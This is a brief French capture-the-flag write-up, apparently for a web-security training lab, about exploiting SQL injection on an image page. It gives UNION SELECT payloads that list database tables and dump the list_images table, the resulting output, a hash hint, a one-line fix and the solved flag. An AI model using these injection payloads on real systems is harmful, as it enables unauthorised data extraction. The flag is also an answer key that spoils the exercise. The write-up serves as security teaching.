Comme pour la page members, on vois un comportement étrange mais pas de message d'erreur synthaxe.

Dans un premier temps on vas lister les tables avec le même payload que précedemment:
    1 UNION SELECT table_schema, table_name FROM information_schema.tables

Dans la listes des tables on vois une tables "list_images" :
    1 UNION SELECT title, comment FROM list_images

résultat :
    ID: 1 UNION SELECT title, comment FROM list_images 
    Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
    Url : Hack me ?


Pour corriger une faille sql il faut sanitize l'entrée utilisateurs

flag : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188